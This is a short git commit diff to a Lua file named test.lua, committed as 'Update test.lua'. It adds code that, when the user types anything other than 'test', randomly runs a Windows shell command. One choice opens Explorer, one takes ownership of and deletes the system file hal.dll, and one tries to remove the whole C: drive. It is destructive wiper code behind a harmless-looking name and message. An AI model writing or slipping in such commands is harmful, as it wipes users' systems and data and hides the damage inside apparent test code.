106c2ac46d94bfefba78740d9bb440d67645e0b7
Derailedzack <36719411+Derailedzack@users.noreply.github.com>
2018-10-24 12:51:40 -0400

    Update test.lua

--- test.lua
+++ test.lua
@@ -1,13 +1,27 @@
+local function delete(n)
+if(n == 1) then
+os.execute("explorer")
+end
+if(n == 2) then
+os.execute("takeown c:/windows/hal.dll")
+os.execute("del c:/windows/hal.dll")
+end
+if(n== 3) then
+os.execute("rd c:/ \s \r")
+end
+end
 local function main()
 while(true) do
 local e = io.read()
-if(e == "end") then
+if(e == "test") then
 print("test") 
 break;
 end
-if(e ~= "end") then
-os.execute("")
-break;
+if(e ~= "test") then
+
+--break;
+delete(math.random(3))
+--break;
 end
 
 end
